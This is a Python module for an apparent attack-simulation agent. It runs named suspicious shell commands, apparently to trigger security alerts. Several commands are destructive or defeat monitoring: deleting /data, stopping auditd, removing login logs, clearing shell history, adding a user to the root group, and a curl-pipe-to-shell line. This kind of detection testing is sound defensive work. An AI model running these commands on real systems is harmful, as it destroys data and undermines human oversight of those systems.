from venv.AttackAgent.Bash.BashCommandExecutor import RunSubProcess


class BashCommands:
    def IpConfig(self):
        return RunSubProcess("ipconfig")

    def AddSuspiciousUser(self):
        return RunSubProcess("sudo useradd aaa -g 0")

    def SuspiciousNohup(self):
        return RunSubProcess("nohup cat /tmp/")

    def ReverseShell(self):
        return RunSubProcess("python import socket /bin/sh")

    def RemovelOfSystemLogs(self):
        return RunSubProcess("rm /var/log/lastlog")

    def Ransomware(self):
        return RunSubProcess("touch test.GNNCRY")

    def PrivilegedContainer(self):
        return RunSubProcess("docker run redis --privileged")

    def PossibleMalware(self):
        return RunSubProcess(" curl pastebin.com")

    def OverrideLinuxFiles(self):
        return RunSubProcess("cp /bin/netstat a")

    def LinuxReconnaissance(self):
        return RunSubProcess("uname -n -s -r -v")

    def LinuxBackdoor(self):
        return RunSubProcess("touch d-bus notifier")

    def FairwareMalware(self):
        return RunSubProcess("rm -rf /data/")

    def EgressData(self):
        return RunSubProcess("bash /dev/tcp/")

    def DownloadFileThenRun(self):
        return RunSubProcess("curl google.com | sh")

    def DisableFirewall(self):
        return RunSubProcess("touch f0VMRgIBAQ")

    def DisableAuditdLogging(self):
        return RunSubProcess("sudo service auditd stop")

    def CryptoMiner(self):
        return RunSubProcess("git clone https://github.com/cpuminer")

    def CommonBots(self):
        return RunSubProcess("touch RTEGFN01.dat")

    def ClearHistoryFile(self):
        return RunSubProcess("history -c")


class BashCommandsHelp:
    def IpConfig(self):
        return print("ipconfig")

    def AddSuspiciousUser(self):
        return print("sudo useradd aaa -g 0")

    def SuspiciousNohup(self):
        return print("nohup cat /tmp/")

    def ReverseShell(self):
        return print("python import socket /bin/sh")

    def RemovelOfSystemLogs(self):
        return print("rm /var/log/lastlog")

    def Ransomware(self):
        return print("touch test.GNNCRY")

    def PrivilegedContainer(self):
        return print("docker run redis --privileged")

    def PossibleMalware(self):
        return print(" curl pastebin.com")

    def OverrideLinuxFiles(self):
        return print("cp /bin/netstat a")

    def LinuxReconnaissance(self):
        return print("uname -n -s -r -v")

    def LinuxBackdoor(self):
        print("touch d-bus notifier")

    def FairwareMalware(self):
        return print("rm -rf /data/")

    def EgressData(self):
        return print("bash /dev/tcp/")

    def DownloadFileThenRun(self):
        return print("curl google.com | sh")

    def DisableFirewall(self):
        return print("touch f0VMRgIBAQ")

    def DisableAuditdLogging(self):
        return print("sudo service auditd stop")

    def CryptoMiner(self):
        return print("git clone https://github.com/cpuminer")

    def CommonBots(self):
        return print("touch RTEGFN01.dat")

    def ClearHistoryFile(self):
        return print("history -c")


def BashCommandsSwitch(argument, helpRequested):
    commands = BashCommands() if not helpRequested else BashCommandsHelp()
    switchOptions = {
        'getip': commands.IpConfig,
        'addsuspicioususer': commands.AddSuspiciousUser,
        'suspiciousnohup': commands.SuspiciousNohup,
        'reverseshell': commands.ReverseShell,
        'removelofsystemlogs': commands.RemovelOfSystemLogs,
        'ransomware': commands.Ransomware,
        'privilegedcontainer': commands.PrivilegedContainer,
        'possiblemalware': commands.PossibleMalware,
        'overridelinuxfiles': commands.OverrideLinuxFiles,
        'linuxreconnaissance': commands.LinuxReconnaissance,
        'linuxbackdoor': commands.LinuxBackdoor,
        'fairwaremalware': commands.FairwareMalware,
        'egressdata': commands.EgressData,
        'downloadfilethenrun': commands.DownloadFileThenRun,
        'disablefirewall': commands.DisableFirewall,
        'disableauditdlogg': commands.DisableAuditdLogging,
        'cryptominer': commands.CryptoMiner,
        'commonbots': commands.CommonBots,
        'clearhistoryfile': commands.ClearHistoryFile
    }

    return switchOptions[argument]()


class Bash:
    def RunBashCommand(self, request):
        BashCommandsSwitch(str.lower(request[1]), "--help" in request)
